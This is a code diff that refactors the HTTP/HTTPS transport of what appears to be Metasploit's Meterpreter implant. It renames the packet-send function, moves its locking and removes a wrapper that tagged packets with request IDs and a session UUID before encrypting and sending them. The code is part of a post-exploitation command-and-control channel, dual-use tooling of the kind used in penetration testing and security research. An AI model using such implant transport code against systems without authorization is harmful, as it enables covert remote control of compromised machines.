@@ -279,13 +279,15 @@ static DWORD validate_response_winhttp(HANDLE hReq, HttpTransportContext* ctx)
  * @param completion Pointer to the completion routines to process.
  * @return An indication of the result of processing the transmission request.
  */
-static DWORD packet_transmit_http(Remote *remote, LPBYTE content, DWORD contentLength)
+static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPacketLength)
 {
 	DWORD res = 0;
 	HINTERNET hReq;
 	BOOL result;
 	DWORD retries = 5;
 	HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
+
+	lock_acquire(remote->lock);
 
 	do
 	{
@@ -295,7 +297,7 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE content, DWORD contentL
 			break;
 		}
 
-		result = ctx->send_req(hReq, content, contentLength);
+		result = ctx->send_req(hReq, rawPacket, rawPacketLength);
 
 		if (!result)
 		{
@@ -308,77 +310,6 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE content, DWORD contentL
 	} while(0);
 
 	ctx->close_req(hReq);
-	return res;
-}
-
-/*!
- * @brief Transmit a packet via HTTP(s) _and_ destroy it.
- * @param remote Pointer to the \c Remote instance.
- * @param packet Pointer to the \c Packet that is to be sent.
- * @param completion Pointer to the completion routines to process.
- * @return An indication of the result of processing the transmission request.
- */
-static DWORD packet_transmit_via_http(Remote *remote, Packet *packet, PacketRequestCompletion *completion)
-{
-	Tlv requestId;
-	DWORD res;
-	BYTE* encryptedPacket = NULL;
-	DWORD encryptedPacketLength = 0;
-
-	lock_acquire(remote->lock);
-
-	// If the packet does not already have a request identifier, create one for it
-	if (packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID, &requestId) != ERROR_SUCCESS)
-	{
-		DWORD index;
-		CHAR rid[32];
-
-		rid[sizeof(rid)-1] = 0;
-
-		for (index = 0; index < sizeof(rid)-1; index++)
-		{
-			rid[index] = (rand() % 0x5e) + 0x21;
-		}
-
-		packet_add_tlv_string(packet, TLV_TYPE_REQUEST_ID, rid);
-	}
-
-	// Always add the UUID to the packet as well, so that MSF knows who and what we are
-  	packet_add_tlv_raw(packet, TLV_TYPE_UUID, remote->orig_config->session.uuid, UUID_SIZE);
-
-	do
-	{
-		// If a completion routine was supplied and the packet has a request
-		// identifier, insert the completion routine into the list
-		if ((completion) &&
-			(packet_get_tlv_string(packet, TLV_TYPE_REQUEST_ID,
-			&requestId) == ERROR_SUCCESS))
-		{
-			packet_add_completion_handler((LPCSTR)requestId.buffer, completion);
-		}
-
-		encrypt_packet(remote, packet, &encryptedPacket, &encryptedPacketLength);
-
-		dprintf("[PACKET] Transmitting packet of length %d to remote", packet->payloadLength);
-		res = packet_transmit_http(remote, encryptedPacket, encryptedPacketLength);
-		if (res < 0)
-		{
-			dprintf("[PACKET] transmit failed with return %d\n", res);
-			break;
-		}
-
-		SetLastError(ERROR_SUCCESS);
-	} while (0);
-
-	res = GetLastError();
-
-	if (encryptedPacket != NULL)
-	{
-		free(encryptedPacket);
-	}
-
-	// Destroy the packet
-	packet_destroy(packet);
 
 	lock_release(remote->lock);
 
@@ -990,7 +921,7 @@ Transport* transport_create_http(MetsrvTransportHttp* config)
 	transport->timeouts.retry_wait = config->common.retry_wait;
 	transport->type = ctx->ssl ? METERPRETER_TRANSPORT_HTTPS : METERPRETER_TRANSPORT_HTTP;
 	ctx->url = transport->url = _wcsdup(config->common.url);
-	transport->packet_transmit = packet_transmit_via_http;
+	transport->packet_transmit = packet_transmit_http;
 	transport->server_dispatch = server_dispatch_http;
 	transport->transport_init = server_init_winhttp;
 	transport->transport_deinit = server_deinit_http;
